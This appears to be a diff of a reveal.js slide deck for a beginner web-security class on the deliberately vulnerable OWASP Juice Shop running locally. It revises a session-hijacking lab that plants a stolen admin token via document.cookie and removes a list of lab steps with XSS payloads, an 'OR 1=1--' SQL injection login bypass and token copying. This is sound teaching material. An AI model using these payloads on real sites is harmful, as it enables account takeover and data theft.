@@ -2263,14 +2263,23 @@
     <li>We&apos;ll combine what we&apos;ve learned — use SQL injection to get admin, then steal the token</li>
     <li>Log into Juice Shop using the SQL injection payload from earlier</li>
     <li>Open <strong>F12 → Application → Local Storage → localhost:3000</strong></li>
-    <li>Find and copy the <strong>token</strong> value</li>
+    <li>Find and copy the <strong>token</strong> value
+     <ul>
+       <li>Its under "Cookies"
+     </ul>
+    </li>
   </ul>
+</section>
+
+<section>
+  <h2>Lab: Hijack the Admin Session</h2>
   <ul>
     <li class="fragment">Now open a <strong>private/incognito window</strong> and go to <strong>http://localhost:3000</strong></li>
+    <li class="fragment">Create an account on juice-shop and log in</li>
     <li class="fragment">Open the console there and run:</li>
   </ul>
   <pre class="fragment" style="font-size:0.78em; background:#111; padding:15px; color:#ddd;">
-    localStorage.setItem(&apos;token&apos;, &apos;PASTE_TOKEN_HERE&apos;)
+    document.cookie = 'token=INSERT_TOKEN_HERE'
   </pre>
 </section>
 
@@ -2299,79 +2308,6 @@
     <li class="fragment"><strong>Cookie Theft</strong> — steal session tokens to impersonate users without a password</li>
     <li class="fragment"><strong>SQL Injection</strong> — inject SQL into input fields to bypass auth or dump databases</li>
   </ul>
-</section>
-
-<section>
-  <h2>All Lab Instructions</h2>
-
-  <div style="
-              font-size:0.75em;
-              background:#111;
-              padding:15px;
-              color:#ddd;
-              max-height:70vh;
-              overflow-y:auto;
-              border:1px solid #333;
-              white-space:pre-wrap;
-              font-family:monospace;
-              ">
-
-    LAB 1: wget
-    - Run:
-    wget http://&lt;your-ip&gt;/index.html
-    cat index.html
-
-
-    LAB 2: Directory Busting (Juice Shop)
-    - Start dirb scan:
-    dirb http://localhost:3000
-    - Look for 200 responses (especially /scoreboard)
-    - Visit discovered paths manually
-
-
-    LAB 3: JavaScript Console (Juice Shop)
-    - Open http://localhost:3000
-    - Press F12 ? Console
-    - Run:
-    console.log("hello")
-    2 + 2
-    alert("I am in your browser")
-    document.title
-    document.title = "Hacked"
-    document.querySelector("h1").innerText = "Juice Hacked"
-
-
-    LAB 4: Reflected XSS
-    - Open:
-    http://localhost:3000/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
-    - Or use browser widget slide
-
-
-    LAB 5: DOM XSS (Juice Shop search bar)
-    - Input:
-    &lt;iframe src="javascript:alert('xss')"&gt;
-
-
-    LAB 6: SQL Injection (login bypass)
-    - Go to:
-    http://localhost:3000/#/login
-    - Email field:
-    admin&apros; OR 1=1--
-    - Any password works
-
-
-    LAB 7: Cookies
-    - Open DevTools ? Application ? Cookies
-    - Run in console:
-    document.cookie
-
-
-    LAB 8: Session Hijacking (demo)
-    - Copy token from Local Storage
-    - In incognito:
-    localStorage.setItem(&apros;token&apros;, &apros;PASTE_TOKEN_HERE&apros;)
-
-  </div>
 </section>
 
 <script src="https://unpkg.com/reveal.js/dist/reveal.js"></script>
